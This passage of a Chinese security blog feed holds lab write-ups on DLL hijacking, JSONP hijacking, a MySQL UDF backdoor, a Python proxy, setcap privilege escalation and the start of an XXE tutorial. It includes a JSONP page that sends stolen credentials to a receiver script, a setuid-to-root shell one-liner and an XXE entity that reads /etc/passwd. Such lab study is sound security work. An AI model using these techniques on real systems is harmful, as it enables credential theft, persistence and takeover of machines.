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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
        <tags>
            
            <tag> htb </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CDPSvc DLL劫持-复现</title>
      <link href="/posts/f4ae96f0.html"/>
      <url>/posts/f4ae96f0.html</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>晚上看见这篇文章：<a href="https://itm4n.github.io/cdpsvc-dll-hijacking/，闲来无事复现一波" target="_blank" rel="noopener">https://itm4n.github.io/cdpsvc-dll-hijacking/，闲来无事复现一波</a><br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9udw4ci6ij313q0l2wh9.jpg" alt="006LG7Nygy1g9udw4ci6ij313q0l2wh9.jpg"></p><h2 id="0x01漏洞简要说明"><a href="#0x01漏洞简要说明" class="headerlink" title="0x01漏洞简要说明"></a>0x01漏洞简要说明</h2><p>由于一个叫<code>cdpsgshims.dll</code>的DLL没有做绝对路径的设置，而CDPSvc这个服务在使用的时候会从Path路径寻找这个DLL。CDPSvc服务在svchost里，启动是服务权限有资格调用对应的令牌来创建一个高权进程</p><p>并且这个服务在widnows 10 17601之后就默认自启动</p><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9ue1dj86qj315y0a342s.jpg" alt="006LG7Nygy1g9ue1dj86qj315y0a342s.jpg"></p><h2 id="0x02复现"><a href="#0x02复现" class="headerlink" title="0x02复现"></a>0x02复现</h2><p>环境：</p><pre><code>OS:Windows 10 (build 18362.2)工具:Process Monitor</code></pre><p>随便往Path里添加个路径<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9ue6a76w2j30ry0e674x.jpg" alt="006LG7Nygy1g9ue6a76w2j30ry0e674x.jpg"></p><p>将这个文件夹赋予<code>Everyone</code>的权限，否则会报权限不够的问题<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9ue7kostej318m0h8n26.jpg" alt="006LG7Nygy1g9ue7kostej318m0h8n26.jpg"></p><p>将作者给出的DLL放入对应的Path路径，重启CDPSvc服务<br><a href="https://github.com/itm4n/CDPSvcDllHijacking" target="_blank" rel="noopener">GitHub - itm4n/CDPSvcDllHijacking: Windows 10 CDPSvc DLL Hijacking - From LOCAL SERVICE to SYSTEM</a><br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9ue8llqh7j30v00grq4m.jpg" alt="006LG7Nygy1g9ue8llqh7j30v00grq4m.jpg"></p><pre><code>net stop cdpsvcnet start cdpsvc</code></pre><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9ue9v6y70j31430fzjwi.jpg" alt="006LG7Nygy1g9ue9v6y70j31430fzjwi.jpg"></p><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9ueah9f3kj314a0mqn3p.jpg" alt="006LG7Nygy1g9ueah9f3kj314a0mqn3p.jpg"></p><p>如果要自己写个DLL的话得申请令牌之类的..我太菜了</p><h2 id="0x03参考链接"><a href="#0x03参考链接" class="headerlink" title="0x03参考链接"></a>0x03参考链接</h2><p><a href="https://itm4n.github.io/cdpsvc-dll-hijacking/" target="_blank" rel="noopener">CDPSvc DLL Hijacking - From LOCAL SERVICE to SYSTEM | PS C:\Users\itm4n> _</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Jsonp劫持</title>
      <link href="/posts/95sd3c49.html"/>
      <url>/posts/95sd3c49.html</url>
      <content type="html"><![CDATA[<h1 id="Jsonp劫持"><a href="#Jsonp劫持" class="headerlink" title="Jsonp劫持"></a>Jsonp劫持</h1><h2 id="jsonp劫持的原理"><a href="#jsonp劫持的原理" class="headerlink" title="jsonp劫持的原理"></a>jsonp劫持的原理</h2><p>使用json进行敏感信息传递。攻击机者写一个伪造的页面欺骗受害者点击这个页面，导致json信息被暗中采集。感觉和CSRF差不多…<br>利用手法大概如图：<br><img src="https://s2.ax1x.com/2019/12/08/Qamm0x.png" alt="Qamm0x.png"></p><h2 id="小试"><a href="#小试" class="headerlink" title="小试"></a>小试</h2><p>jsonp.php</p><pre><code class="php">&lt;?phpheader(&#39;Content-type: application/json&#39;);$jsoncallback = htmlspecialchars($_REQUEST [&#39;jsoncallback&#39;]);//获取回调函数名//json数据//$json_data = &#39;[&quot;id&quot;,&quot;user&quot;]&#39;;if(isset($_REQUEST[&#39;jsoncallback&#39;])){    $json_data=&#39;({&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Aaron&quot;,&quot;password&quot;:&quot;1234567890&quot;})&#39;;    echo $jsoncallback . &quot;(&quot; . $json_data . &quot;)&quot;;//输出jsonp格式的数据}?&gt;</code></pre><p>访问jsonp.php会得到json信息<br><img src="https://s2.ax1x.com/2019/12/08/QamB9g.png" alt="QamB9g.png"></p><p>hijack.html</p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;JSONP劫持测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;function callbackFunction(result)        {            alert(&quot;username:&quot;+result.name+&quot; password:&quot;+result.password);        }&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/jsonp.php?jsoncallback=callbackFunction&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/12/08/QamIgJ.png" alt=""></p><p>当然也可以写一个php接收请求，然后在把得到的内容保存到txt<br>vk.php</p><pre><code class="php">&lt;?php$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];if(isset($username)&amp;&amp;isset($password)){    $data=&quot;用户名:&quot;.$username.&quot;密码:&quot;.$password;    file_put_contents(&quot;pwd.txt&quot;,$data);}?&gt;</code></pre><p>修改js</p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;JSONP劫持测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;function callbackFunction(result)        {            var username=result.name;            var password=result.password;            const requests=new XMLHttpRequest();            const url=&quot;http://127.0.0.1/vk.php?username=&quot;+username+&quot;&amp;password=&quot;+password;            requests.open(&quot;GET&quot;,url);            requests.send();        }&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/jsonp.php?jsoncallback=callbackFunction&quot;&gt;&lt;/script&gt; &lt;!-- 将得到的json转给callbackFunction函数处理&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/12/08/QanWqI.png" alt=""></p><p>如果是被那种钓鱼的话，估计js会被混淆的很严重…</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/xiaozi/p/9963523.html" target="_blank" rel="noopener">JSONP 劫持漏洞实例 - Bypass - 博客园</a><br><a href="https://blog.csdn.net/u012628581/article/details/95495054" target="_blank" rel="noopener">JSONP劫持</a></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><a href="https://shuimugan.com/bug/view?bug_no=11284" target="_blank" rel="noopener">360某json hijacking(只要你登陆访问，我就知道你的用户名，邮箱) | 乌云漏洞库,乌云镜像站, WooYun 漏洞库, WooYun 镜像站</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>mysql插件(后门)开发</title>
      <link href="/posts/657d3c49.html"/>
      <url>/posts/657d3c49.html</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>早上看到某文章讲数据库维权。此时，群内某dalao发话表示，用dll做插件加载也可以（滑稽）。那么下午弄个来康康<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1575376974715&amp;di=c5b680b0659d2f3295802edb960352f2&amp;imgtype=0&amp;src=http%3A%2F%2Fi0.hdslb.com%2Fbfs%2Farticle%2Ff38a65a18cad5d1b09691e6ad913f81f2913e6ee.jpg" alt=""></p><h2 id="0x01正文"><a href="#0x01正文" class="headerlink" title="0x01正文"></a>0x01正文</h2><p>环境：</p><pre><code>VS2015Mysql头部文件</code></pre><p>mysql头部文件下载：<a href="https://downloads.mysql.com/archives/c-c/" target="_blank" rel="noopener">MySQL :: Download MySQL Connector/C (Archived Versions)</a></p><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jowl0u7sj31b50l7ad6.jpg" alt=""></p><p>创建一个静态DLL项目，然后引用外部文件（mysql-connector-c-6.1.11-winx64\include）<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9joycgsulj30oq0nkdhz.jpg" alt=""></p><p>将mysql-connector-c-6.1.11-winx64\lib文件夹下的libmysql.lib和libmysql.dll复制到项目根目录<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp0u1kf6j30y60imjul.jpg" alt=""></p><p>引用lib，导入mysql.h开始写即可</p><pre><code class="c++">// ConsoleApplication1.cpp : 定义 DLL 应用程序的导出函数。//#include &quot;stdafx.h&quot;#include &lt;mysql.h&gt;#pragma comment(lib,&quot;libmysql&quot;) //引用lib文件extern &quot;C&quot; {    __declspec(dllexport) void udf_test() {        system(&quot;calc.exe&quot;);    }    __declspec(dllexport) my_bool udf_test_init() { //创建一个函数后要创建对应的 &quot;函数名_init()&quot;函数，不软会报错，如error.jpg        return 0;    }}</code></pre><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp3ehglij30it0cat9h.jpg" alt="error.jpg"></p><p>编译环境选择Release x86,根据本机的环境不同而选择。如果x86生成出的dll加载错误就用x64生成在加载</p><p>将生成的dll放入mysql的\lib\plugin文件夹下<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp6g1gd5j30mz0ba74x.jpg" alt=""></p><p>自定义一个函数，和dll里相同的函数。在调用即可弹出calc</p><pre><code>CREATE FUNCTION udf_test RETURNS INTEGER SONAME &quot;dc.dll&quot;;select udf_test();</code></pre><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp83ayj9j30pl0lpdiy.jpg" alt=""></p><h2 id="0x02参考链接"><a href="#0x02参考链接" class="headerlink" title="0x02参考链接"></a>0x02参考链接</h2><p><a href="https://blog.csdn.net/albertsh/article/details/78567661" target="_blank" rel="noopener">mysql函数扩展之UDF开发</a><br><a href="https://blog.csdn.net/weixin_43134135/article/details/82391821" target="_blank" rel="noopener">windows+vs2017+C语言 引入mysql.h对MYSQL数据库的操作</a></p>]]></content>
      
      
        <tags>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>简单的实现一个HTTP代理</title>
      <link href="/posts/2aaeb1.html"/>
      <url>/posts/2aaeb1.html</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>之前一直尝试先个http代理，每次都是败北而归。这次稍微好一点….补上坑吧<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1575308314356&amp;di=7e29c0b116060d76c0a7daa25a63ed15&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201711%2F25%2F20171125231052_rRBuv.thumb.1000_0.jpeg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1575308314356&amp;di=7e29c0b116060d76c0a7daa25a63ed15&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201711%2F25%2F20171125231052_rRBuv.thumb.1000_0.jpeg"></p><h2 id="0x01如何实现"><a href="#0x01如何实现" class="headerlink" title="0x01如何实现"></a>0x01如何实现</h2><p>HTTP代理</p><pre><code>request浏览器-&gt;py(代理)-&gt;目标response目标-&gt;py(代理)-&gt;浏览器</code></pre><p>获取Host头里指向的域名和端口，如果没有指定端口默认为80，处理<code>Proxy-Connection</code>头部。将<code>Proxy-Connection</code>修改为<code>Connection: close</code>。</p><p>使用异步来处理请求，否则可能会出现响应跟不上的问题</p><h2 id="0x02实现"><a href="#0x02实现" class="headerlink" title="0x02实现"></a>0x02实现</h2><pre><code class="python">#@author:九世#@time:2019/12/2#@file:test.pyfrom gevent.monkey import patch_all;patch_all()from gevent.server import StreamServerimport socketimport reclass Http(object):    def __init__(self,text):        self.yuan=text        self.text=bytes.decode(text).replace(&#39;\r&#39;,&#39;&#39;)        self.headers={}        self.TUNNEL_OK = b&#39;HTTP/1.1 200 Connection Established\r\nConnection: close\r\n\r\n&#39;    def proxyconnection(self,text):        self.yuan=re.sub(b&quot;Proxy-Connection&quot;,b&quot;Connection&quot;,self.yuan)        self.yuan=re.sub(b&quot;keep-alive&quot;,b&quot;close&quot;,self.yuan)        domain=re.findall(&quot;\s.* HTTP&quot;,text)[0]        dtm=str(domain).rstrip().lstrip().replace(self.headers[&#39;Host&#39;],&#39;&#39;).replace(&#39;http://&#39;,&#39; &#39;).replace(&#39;https://&#39;,&#39; &#39;)        searchs=str(domain)        self.yuan=re.sub(bytes(searchs,encoding=&#39;utf-8&#39;),bytes(dtm,encoding=&#39;utf-8&#39;),self.yuan)    def jiexi(self):        try:            data=re.findall(&#39;Host[:].*&#39;,self.text)            if len(data)&gt;0:                dt=str(data[0]).replace(&#39;Host:&#39;,&#39;&#39;).split(&#39;:&#39;)                if len(dt)==2:                    self.headers[&#39;Host&#39;]=str(&#39;{}&#39;.format(dt[0]).strip().rstrip())                    self.headers[&#39;port&#39;]=dt[1]                else:                    self.headers[&#39;Host&#39;]=str(&#39;{}&#39;.format(dt[0])).rstrip().lstrip()                    self.headers[&#39;port&#39;]=80            if &#39;Proxy-Connection&#39; in self.text and not &quot;CONNECT&quot; in self.text:                self.proxyconnection(self.text)            if &#39;Host&#39; in self.headers:                return self.headers[&#39;Host&#39;],self.headers[&#39;port&#39;],self.yuan        except:            pass    def send_banners(self,host,port,data):        jg=b&#39;&#39;        c=socket.socket()        c.connect((host,int(port)))        c.sendall(data)        while True:            rc=c.recv(4096)            if rc:                jg+=rc            else:                break        return jgdef main(s,address):    try:        while True:            request = s.recv(4096)            print(request)            obj = Http(request)            jg = obj.jiexi()            if b&#39;CONNECT&#39; in request:                s.sendall(obj.TUNNEL_OK)                while True:                    rv=s.recv(1024)                    if rv:                        fb=obj.send_banners(jg[0],jg[1],rv)                        print(fb)                        s.sendall(fb)                    else:                        break            else:                fb = obj.send_banners(jg[0], jg[1], jg[2])                s.sendall(fb)    except Exception as r:        if &#39;not subscriptable&#39; in str(r):            passif __name__ == &#39;__main__&#39;:    print(&#39;[+] 开始监听&#39;)    try:        server=StreamServer((&quot;127.0.0.1&quot;,4444),main)        server.serve_forever()    except:        pass    &#39;&#39;&#39;    s=socket.socket()    s.bind((&#39;127.0.0.1&#39;,4444))    s.listen(1)    while True:        accept,adr=s.accept()        request=accept.recv(4096)        print(request)        obj=Http(request)        jg=obj.jiexi()        fb=obj.send_banners(jg[0],jg[1],jg[2])        accept.sendall(fb)    &#39;&#39;&#39;</code></pre><p><img src="https://s2.ax1x.com/2019/12/02/QuXh3F.gif" alt=""></p><p><img src="https://s2.ax1x.com/2019/12/02/QuXvge.png" alt="QuXvge.png"></p><p>小结：<br>1.解析HTTP请求获取Host头里请求的内容和端口<br>2.使用异步来处理，否则会出现响应更不上的问题<br>3.修改Proxy-Connection头为Connection:close<br>4.处理HTTPS   </p><h2 id="0x03缺陷"><a href="#0x03缺陷" class="headerlink" title="0x03缺陷"></a>0x03缺陷</h2><ul><li>无法转发HTTPS</li><li>某些隐性BUG</li></ul><h2 id="0x04参考链接"><a href="#0x04参考链接" class="headerlink" title="0x04参考链接"></a>0x04参考链接</h2><p><a href="https://www.cnblogs.com/ningci/p/5446681.html" target="_blank" rel="noopener">python http代理支持 https - 宁次 - 博客园</a><br><a href="https://www.zhihu.com/question/21955083/answer/142736329" target="_blank" rel="noopener">什么是HTTP隧道，怎么理解HTTP隧道呢？ - 知乎</a><br><a href="https://codeday.me/bug/20190407/903445.html" target="_blank" rel="noopener">Python HTTPS代理隧道 - 代码日志</a><br><a href="https://codeday.me/bug/20190511/1074592.html" target="_blank" rel="noopener">python – gevent StreamServer.start()似乎没有做我期望的 - 代码日志</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>setcap设置的文件可控造成的提权</title>
      <link href="/posts/9dcc308e.html"/>
      <url>/posts/9dcc308e.html</url>
      <content type="html"><![CDATA[<h2 id="0x01-SUID"><a href="#0x01-SUID" class="headerlink" title="0x01 SUID"></a>0x01 SUID</h2><p>能力介绍<br>Linux中的功能是什么</p><p>在获得功能之前，我们只有特权和非特权进程的二进制系统，并且出于执行权限检查的目的，传统的UNIX实现将进程分为两类：特权进程（称为超级用户或根）和非特权进程（其有效UID为非零）。</p><p>功能是将内核用户或内核级程序的特权分成小块的那些权限，以便可以使进程有足够的能力执行特定的特权任务。</p><p>功能和SUID之间的区别</p><p>SUID： SUID代表设置的用户ID，并允许用户以文件所有者的身份执行文件。这被定义为授予用户临时权限，使其在文件所有者（而不是运行文件所有者）的权限下运行程序/文件。使用“查找”命令可以很容易地检测到。要查找在当前目录中设置了SUID的所有文件，我们可以使用-perm选项，该选项将仅打印许可权设置为4000的文件（允许进程临时使用root的权限执行）</p><p>给予某个文件拥有临时权限的命令<br>例子：</p><pre><code>chmod u+s /usr/bin/python</code></pre><p>使用find命令可以找出SUID文件</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qmmes0.png" alt="Qmmes0.png"></p><h2 id="0x02-牛刀小试"><a href="#0x02-牛刀小试" class="headerlink" title="0x02 牛刀小试"></a>0x02 牛刀小试</h2><p>setcap详解：<a href="https://www.cnblogs.com/nf01/articles/10418141.html" target="_blank" rel="noopener">setcap详解 - 农夫运维 - 博客园</a><br>setcap简要说明：</p><pre><code> Capabilities的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作。例如：能力CAP_SYS_MODULE表示用户能够加载(或卸载)内核模块的特权操作，而CAP_SETUID表示用户能够修改进程用户身份的特权操作。在Capbilities中系统将根据进程拥有的能力来进行特权操作的访问控制。</code></pre><p>getcap：检索setcap所设置的文件</p><pre><code>getcap -r  / 2&gt;/dev/null</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/QmnH9H.png" alt="QmnH9H.png"></p><h2 id="0x03实验"><a href="#0x03实验" class="headerlink" title="0x03实验"></a>0x03实验</h2><pre><code>OS：kali测试用户：root、test</code></pre><p>先用root用户给予python SUID</p><pre><code>chmod u+s /usr/bin/python</code></pre><p>查找一波对应的SUID权限的文件,确定是否给予成功</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm1t9U.png" alt="Qm1t9U.png"></p><p>复制python到/tmp目录下，拟态和文章类似的构造</p><pre><code>cp /usr/bin/python</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm3OJK.png" alt="Qm3OJK.png"></p><p>setcap给予tmp目录下的python一个用户临时执行权限</p><pre><code>setcap CAP_SETUID+ep /tmp/python</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm8ues.png" alt="Qm8ues.png"></p><p>切换至test用户，执行以下命令即可获取一个root权限</p><pre><code>getcap -r / 2&gt;/dev/null #查询被赋予权限的文件</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm8sSO.png" alt="Qm8sSO.png"></p><pre><code>./python -c &#39;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm8hkt.png" alt="Qm8hkt.png"></p><h2 id="0x04结论"><a href="#0x04结论" class="headerlink" title="0x04结论"></a>0x04结论</h2><p>getcap -r / 2&gt;/dev/null #查询被赋予CAP_SETUID权限的文件，来获取某些文件是否有利用的价值。目前得出可以利用用的几个</p><pre><code>perlpythontar</code></pre><h2 id="0x05参考链接"><a href="#0x05参考链接" class="headerlink" title="0x05参考链接"></a>0x05参考链接</h2><p><a href="https://www.hackingarticles.in/" target="_blank" rel="noopener">Hacking Articles - Raj Chandel’s Blog</a><br><a href="http://man7.org/linux/man-pages/man8/getcap.8.html" target="_blank" rel="noopener">getcap(8) - Linux manual page</a><br><a href="https://www.cnblogs.com/nf01/articles/10418141.html" target="_blank" rel="noopener">setcap详解 - 农夫运维 - 博客园</a>  </p>]]></content>
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XXE漏洞学习</title>
      <link href="/posts/8867b076.html"/>
      <url>/posts/8867b076.html</url>
      <content type="html"><![CDATA[<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>早上看到某篇公众号的文章发了一篇XXE漏洞挖到个星巴克，拿到了一手奖金。决定晚上瞧一下这个洞<br><img src="https://s2.ax1x.com/2019/11/27/QCIzef.png" alt="QCIzef.png"></p><h1 id="0x01漏洞产生的原因"><a href="#0x01漏洞产生的原因" class="headerlink" title="0x01漏洞产生的原因"></a>0x01漏洞产生的原因</h1><p>XXE又叫XML外部实体注入（XML External Entity Injection）</p><blockquote><p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。<br>例如，如果你当前使用的程序为PHP，则可以将libxml_disable_entity_loader设置为TRUE来禁用外部实体，从而起到防御的目的。</p></blockquote><blockquote><p>XML基础<br>在介绍xxe漏洞前，先学习温顾一下XML的基础知识。XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具</p></blockquote><h1 id="0x02XML简单的用法"><a href="#0x02XML简单的用法" class="headerlink" title="0x02XML简单的用法"></a>0x02XML简单的用法</h1><pre><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;外部实体:&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;参数实体：&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;实例演示：除参数实体外实体+内部实体&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [    &lt;!ENTITY name &quot;nMask&quot;&gt;]&gt;&lt;foo&gt;        &lt;value&gt;&amp;name;&lt;/value&gt; &lt;/foo&gt;实例演示：参数实体+外部实体&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;    %name;]&gt;注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。外部实体外部实体即在DTD中使用&lt;!ENTITY 实体名称 SYSTEM 